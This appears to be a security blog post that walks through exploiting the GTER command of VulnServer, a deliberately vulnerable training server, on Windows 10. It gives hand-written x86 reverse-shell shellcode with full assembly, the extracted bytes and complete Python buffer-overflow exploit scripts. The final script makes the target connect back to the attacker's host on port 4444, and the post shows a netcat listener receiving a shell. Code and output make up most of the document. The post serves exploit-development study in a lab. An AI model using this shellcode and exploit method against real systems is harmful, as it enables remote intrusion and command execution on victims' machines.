---
layout: post
title: VulnServer GTER - no egghunter!
---
If you've exploited VulnServer via the GTER parameter then most likely you used an egghunter to get the job done and had to utilize one of the other commands VulnServer offers to stick your shellcode in. This is due to GTER providing a very small buffer space to work with. I decided to see what was possible with this limited buffer space and see if it was possible to get a shell without having to leverage another command to store shellcode in. After some tinkering I found out is in fact possible to get a reverse shell with the limited buffer space! However it requires a little bit of work and a lot of assembly. Let's get started.

### Setup

Our target machine will be Windows 10 (1803) x86, it's IP address will be 192.168.47.132.
Our attacking box is just a Kali VM with an IP of 192.168.47.128.
We'll be utilizing a little nasm, lots of Microsoft documentation, arwin, as well as Immunity Debugger on Windows. 

Let's first take a look at the PoC for exploiting GTER, I'll be skipping fuzzing, finding the offsets for EIP and also finding a useable address for JMP ESP.

Here's the PoC

```python
#!/usr/bin/python

import socket

host = '192.168.47.132'
port = 9999


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# 625011AF JMP ESP 
jmp_esp = "\xaf\x11\x50\x62"

# max short negative JMP
short_jmp = "\xeb\x80"


crash = "\x90" * 29 + "\x90" * 122 + jmp_esp + short_jmp + "\x43" * 500

buffer = "GTER "
buffer += crash
buffer += "\r\n"

s.connect((host, port))
s.send(buffer)
s.recv(1024)
s.close()
```

In the crash variable I've broken up the NOPs into two separate lengths, this is a marker as to where the short negative JMP will take us back into our buffer, which is right after 29 NOPs. We can see that we have a measly 122 bytes to work with before we run into our JMP ESP address. To put this in perspective a non encoded Metasploit `windows/shell_reverse_tcp` is 324 bytes, however that will have nulls which won't be useable. An encoded version without nulls will be roughly 351 bytes using shikata_ga_nai as an encoder. So we roughly have a third of the required space for this payload.

### Diving In

We have a few required functions to normally get a reverse shell working in Windows. They are:

- LoadLibraryA - this is used to load the winsock DLL ws2_32.dll
- WSAStartup - this intializes the use of the winsock DLL in the process, has to be done before any sockets can be created.
- WSASocketA - this is used to create the socket.
- connect - this uses the created socket and establishes a connection.
- CreateProcessA - this is used to create a cmd process and redirect stdin, stdout, and stderr
- ExitProcess - fairly obvious what this does. However you really don't _need_ this. 

At this point you may be thinking there's no way we'll be able to fit all of those functions and their respected parameters into 122 bytes of shellcode. Well you are right. 

Lucky for us though, our target process will have already loaded the winsock DLL and also initialized it, due to the fact that it's using sockets and binding to a port to provide its functions.

This means we only need to concern ourselves with WSASocketA, connect, and CreateProcessA.  We'll need to get the addresses where these functions live to get started. CreateProcessA lives in kernel32.dll, WSASocketA and connect live in the ws2_32.dll (winsock).

To grab these addresses we'll use arwin on our Windows 10 box. 


```
PS C:\Users\admin\Desktop\arwin> .\arwin.exe kernel32 CreateProcessA
arwin - win32 address resolution program - by steve hanna - v.01
CreateProcessA is located at 0x74f36630 in kernel32

PS C:\Users\admin\Desktop\arwin> .\arwin.exe ws2_32 WSASocketA
arwin - win32 address resolution program - by steve hanna - v.01
WSASocketA is located at 0x754e9730 in ws2_32

PS C:\Users\admin\Desktop\arwin> .\arwin.exe ws2_32 connect
arwin - win32 address resolution program - by steve hanna - v.01
connect is located at 0x754e5ee0 in ws2_32
```

These addresses will obviously only work with the specific Windows version we're attacking. Which means our shellcode won't work across various Windows versions. At least not without replacing the addresses for the correct Windows target version.

With addresses in hand it's now time to start writing some assembly.

First up is WSASocketA. If we reference Microsoft's documentation [here](https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-wsasocketa) we can see that WSASocketA has a syntax as follows.

```
WINSOCK_API_LINKAGE SOCKET WSAAPI WSASocketA(
  int                 af,
  int                 type,
  int                 protocol,
  LPWSAPROTOCOL_INFOA lpProtocolInfo,
  GROUP               g,
  DWORD               dwFlags
);
```

Here is what is should look like with the correct parameters filled in.

```
WINSOCK_API_LINKAGE SOCKET WSAAPI WSASocketA(
  int                 af - 2, AF_INET (IPv4)
  int                 type - 1, SOCK_STREAM (TCP)
  int                 protocol - 6, IPPROTO_TCP (TCP)
  LPWSAPROTOCOL_INFOA lpProtocolInfo - NULL,
  GROUP               g - 0, No group operation
  DWORD               dwFlags - 0 No flags
);
```

We'll need to push these values in reverse to the stack, and then MOV the address of WSASocketA into a register and CALL it. Finally we'll need to stow away our created socket (which will be returned into EAX) in another register for later use.

```nasm
xor eax, eax            ; clear EAX
push eax		; dwFlags - 0
push eax		; Group - 0
push eax		; ProtocolInfo - NULL
xor ebx, ebx	        ; clear EBX	
mov bl, 6		
push ebx		; Protocol - IPPROTO_TCP = 6 		
inc eax		
push eax		; Type - SOCK_STREAM = 1
inc eax
push eax		; Family - AF_INET = 2
mov ebx, 0x754e9730	; WSASocketA - Win10 1803
xor eax, eax
call ebx
xchg eax, esi		; save socket into ESI
```

Next up is connect. Once again we'll reference Microsoft's documentation [here](https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-connect).

The structure for calling connect is as follows:

```
int WSAAPI connect(
  SOCKET         s,
  const sockaddr *name,
  int            namelen
);
```

So for us we'll need to set it up as follows:

```
int WSAAPI connect(
  SOCKET         s - saved socket currently in ESI,
  const sockaddr *name - pointer to IP address and port,
  int            namelen - 16
);
```

Again we'll be push our parameters in reverse, starting with creating a pointer to our our IP address and port. To figure out the address in hex you can simply break each octect down, reverse the order of the octects and convert to hex. ie: 128 = 80, 47 = 2f, 168 = a8, 192 = c0. Thus we'll push 802fa8c0. Same concept for the port. 4444 = 115c, reverse to 5c11.


```nasm
push 0x802fa8c0		; 192.168.47.128
push word 0x5c11	; port 4444
xor ebx, ebx		
add bl, 2
push word bx		
mov edx, esp		; pointer for SockAddr
push byte 16		; AddrLen - 16
push edx		; pSockAddr
push esi		; saved socket
mov ebx, 0x754e5ee0	; connect - Win10 1803
call ebx
```

Finally is CreateProcessA, and boy is it a doozy. Let's see what Microsoft has to say about it's [structure](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa).

```
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

Along with this we also need to provide a pointer for StartupInfo which it's structure is defined [here](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-_startupinfoa).

```
typedef struct _STARTUPINFOA {
  DWORD  cb;
  LPSTR  lpReserved;
  LPSTR  lpDesktop;
  LPSTR  lpTitle;
  DWORD  dwX;
  DWORD  dwY;
  DWORD  dwXSize;
  DWORD  dwYSize;
  DWORD  dwXCountChars;
  DWORD  dwYCountChars;
  DWORD  dwFillAttribute;
  DWORD  dwFlags;
  WORD   wShowWindow;
  WORD   cbReserved2;
  LPBYTE lpReserved2;
  HANDLE hStdInput;
  HANDLE hStdOutput;
  HANDLE hStdError;
}
```

So as you can see we have our work cut out for us here. Luckily a lot of these values are NULL for our purposes. Here's what CreateProcessA should look like. 

```
BOOL CreateProcessA(
  LPCSTR                lpApplicationName - NULL
  LPSTR                 lpCommandLine - pointer to "cmd" we'll store in ECX
  LPSECURITY_ATTRIBUTES lpProcessAttributes - NULL
  LPSECURITY_ATTRIBUTES lpThreadAttributes - NULL
  BOOL                  bInheritHandles - 1 (TRUE)
  DWORD                 dwCreationFlags - 0
  LPVOID                lpEnvironment - NULL
  LPCSTR                lpCurrentDirectory - NULL
  LPSTARTUPINFOA        lpStartupInfo - pointer we'll store in EAX
  LPPROCESS_INFORMATION lpProcessInformation - pointer we'll store in EBX
);
```
Let's go ahead and setup our pointer to "cmd"

```nasm
mov edx, 0x646d6363	; cmdd
shr edx, 8		; cmd
push edx
mov ecx, esp		; pointer to "cmd"
```

We also need a pointer for ProcessInformation, however we can literally just point this to garbage on the stack.

```nasm
xor edx, edx
sub esp, 16
mov ebx, esp		; pointer for ProcessInfo (points to garbage)
```

Now we'll need to create the ridiculous StartUpInfo pointer to reflect the following:

```
typedef struct _STARTUPINFOA {
  DWORD  cb - 0x44, size of structure
  LPSTR  lpReserved - NULL
  LPSTR  lpDesktop - NULL
  LPSTR  lpTitle - NULL
  DWORD  dwX - NULL
  DWORD  dwY - NULL
  DWORD  dwXSize - NULL
  DWORD  dwYSize - NULL
  DWORD  dwXCountChars - NULL
  DWORD  dwYCountChars - NULL
  DWORD  dwFillAttribute - NULL
  DWORD  dwFlags - STARTF_USESTDHANDLES 0x00000100
  WORD   wShowWindow - ignored
  WORD   cbReserved2 - NULL
  LPBYTE lpReserved2 - NULL
  HANDLE hStdInput - saved socket in ESI
  HANDLE hStdOutput - saved socket in ESI
  HANDLE hStdError - saved socket in ESI
}
```

Here we go!

```nasm
push esi		; hStdError - saved socket
push esi		; hStdOutput - saved socket
push esi		; hStdInput -saved socket
push edx		; pReserved2 - NULL	
push edx		; cbReserved2 -NULL
xor eax, eax
inc eax
rol eax, 8			
push eax		; dwFlags - STARTF_USESTDHANDLES 0x00000100
push edx		; dwFillAttribute - NULL
push edx		; dwYCountChars - NULL
push edx		; dwXCountChars - NULL
push edx		; dwYSize - NULL
push edx		; dwXSize - NULL
push edx		; dwY - NULL
push edx		; dwX - NULL
push edx		; pTitle - NULL
push edx		; pDesktop - NULL
push edx		; pReserved - NULL
xor eax, eax
add al, 44
push eax		; cb - size of structure
mov eax, esp		; pStartupInfo
```



Now we are finally ready to call CreateProcessA. 

```nasm
push ebx		; pProcessInfo
push eax		; pStartupInfo
push edx		; CurrentDirectory - NULL
push edx		; pEnvironment - NULL
push edx		; CreationFlags - 0
xor eax, eax
inc eax
push eax		; InheritHandles -TRUE - 1
push edx		; pThreadAttributes -NULL
push edx		; pProcessAttributes - NULL

push ecx		; pCommandLine - pointer to "cmd"
push edx		; ApplicationName - NULL
	
mov ebx, 0x74f36630	; CreateProcessA - Win10 1803
call ebx

```


### Final Assembly Code

```nasm
global _start

section .text

_start:

	; Create the socket with WSASocketA() 
	
	xor eax, eax
	push eax		; Flags - 0
	push eax		; Group - 0
	push eax		; pWSAprotocol - NULL
	xor ebx, ebx		
	mov bl, 6		
	push ebx		; Protocol - IPPROTO_TCP = 6 		
	inc eax		
	push eax		; Type - SOCK_STREAM = 1
	inc eax
	push eax		; Family - AF_INET = 2
	mov ebx, 0x754e9730	; WSASocketA - Win10 1803
	xor eax, eax
	call ebx
	xchg eax, esi		; save socket into ESI

	; connect() to attacking machine

	push 0x802fa8c0		; 192.168.47.128
	push word 0x5c11	; port 4444
	xor ebx, ebx		
	add bl, 2
	push word bx		
	mov edx, esp		; pointer for SockAddr
	push byte 16		; AddrLen - 16
	push edx		; pSockAddr
	push esi		; saved socket
	mov ebx, 0x754e5ee0	; connect - Win10 1803
	call ebx

	; CreateProcessA()

	mov edx, 0x646d6363	; cmdd
	shr edx, 8		; cmd
	push edx
	mov ecx, esp		; pointer to "cmd"

	xor edx, edx
	sub esp, 16
	mov ebx, esp		; pointer for ProcessInfo (points to garbage)

	push esi		; hStdError - saved socket
	push esi		; hStdOutput - saved socket
	push esi		; hStdInput -saved socket
	push edx		; pReserved2 - NULL	
	push edx		; cbReserved2 -NULL
	xor eax, eax
	inc eax
	rol eax, 8			
	push eax		; dwFlags - STARTF_USESTDHANDLES 0x00000100
	push edx		; dwFillAttribute - NULL
	push edx		; dwYCountChars - NULL
	push edx		; dwXCountChars - NULL
	push edx		; dwYSize - NULL
	push edx		; dwXSize - NULL
	push edx		; dwY - NULL
	push edx		; dwX - NULL
	push edx		; pTitle - NULL
	push edx		; pDesktop - NULL
	push edx		; pReserved - NULL
	xor eax, eax
	add al, 44
	push eax		; cb - size of structure
	mov eax, esp		; pStartupInfo

	push ebx		; pProcessInfo
	push eax		; pStartupInfo
	push edx		; CurrentDirectory - NULL
	push edx		; pEnvironment - NULL
	push edx		; CreationFlags - 0
	xor eax, eax
	inc eax
	push eax		; InheritHandles -TRUE - 1
	push edx		; pThreadAttributes -NULL
	push edx		; pProcessAttributes - NULL
	push ecx		; pCommandLine - pointer to "cmd"
	push edx		; ApplicationName - NULL
	
	mov ebx, 0x74f36630	; CreateProcessA - Win10 1803
	call ebx

```

No we'll compile with nasm and extract our shellcode out.

```
root@kali:~# nasm -f elf32 -o revshell.o revshell.nasm
root@kali:~# ld -o revshell revshell.o

root@kali:~# for i in $(objdump -d win10revshell |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x30\x97\x4e\x75\x31\xc0\xff\xd3\x96\x68\xc0\xa8\x2f\x80\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\xe0\x5e\x4e\x75\xff\xd3\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x56\x56\x56\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51\x52\xbb\x30\x66\xf3\x74\xff\xd3
```

And we have 120 bytes of reverse shellcode! We squeezed by with 2 bytes left to spare.

Let's update our PoC

```python
#!/usr/bin/python

import socket

host = '192.168.47.132'
port = 9999


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# 625011AF
jmp_esp = "\xaf\x11\x50\x62"

# max short negative JMP
short_jmp = "\xeb\x80"

revshell  = "\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x30\x97\x4e\x75\x31\xc0\xff\xd3" 
revshell += "\x96\x68\xc0\xa8\x2f\x80\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\xe0" 
revshell += "\x5e\x4e\x75\xff\xd3\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x56\x56" 
revshell += "\x56\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x2c\x50"
revshell += "\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51\x52\xbb\x30\x66\xf3\x74\xff\xd3"


crash = "\x90" * 29 + revshell + "\x90" * 2 + jmp_esp + short_jmp + "\x43" * 500

buffer = "GTER "
buffer += crash
buffer += "\r\n"

s.connect((host, port))
s.send(buffer)
s.recv(1024)
s.close()
print len(revshell)
```

### Not so fast....

However if we run this no shell comes. If we take a look in the debugger we can see it's a stack alignment issue.

![stack](/img/gter-stack.png)

ESP is actually pointing to the location of our short negative JMP. 

![jmp](/img/gter-jmp.png)

Which means if we start pushing instructions to the stack we will start overwriting our shellcode above.

To work around this take a look at the EAX register, it's value currently points to an address much lower than ESP and actually sits well above our shellcode. In fact it points to the very beginning of the GTER request. So what we can do is PUSH the value of EAX to the stack (yes we will overwrite our negative JMP but it won't matter at this point since we've already taken the JMP!) and then we'll POP that value directly into ESP.

Add the instructions in at the beginning of where our shellcode would start and let's test.

![pushpop](/img/gter-pushpop.png)

Let's step through these instructions and inspect our registers and stack again.

![newregs](/img/gter-reg.png)

![newstack](/img/gter-newstack.png)

We can see now that our stack will write above our shellcode and will execute correctly now. Let's update the PoC with the PUSH EAX, POP ESP instructions (\x50\x5c) and test.

### Final Exploit

```python
#!/usr/bin/python

import socket

host = '192.168.47.132'
port = 9999


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# 625011AF
jmp_esp = "\xaf\x11\x50\x62"

# max short negative JMP
short_jmp = "\xeb\x80"

revshell  = "\x50\x5c\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x30\x97\x4e\x75\x31\xc0\xff" 
revshell += "\xd3\x96\x68\xc0\xa8\x2f\x80\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\xe0" 
revshell += "\x5e\x4e\x75\xff\xd3\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x56\x56\x56\x52" 
revshell += "\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53"
revshell += "\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51\x52\xbb\x30\x66\xf3\x74\xff\xd3"


crash = "\x90" * 29 + revshell + jmp_esp + short_jmp + "\x43" * 500

buffer = "GTER "
buffer += crash
buffer += "\r\n"

s.connect((host, port))
s.send(buffer)
s.recv(1024)
s.close()

```

```
root@kali:~# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.47.128] from (UNKNOWN) [192.168.47.132] 49853
Microsoft Windows [Version 10.0.17134.165]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\admin\Desktop\vulnserver>whoami
whoami
desktop-ofau55f\admin

C:\Users\admin\Desktop\vulnserver>
```

Perfect! 


### Resources other than Microsoft

Skape is the man: <http://www.hick.org/code/skape/papers/win32-shellcode.pdf>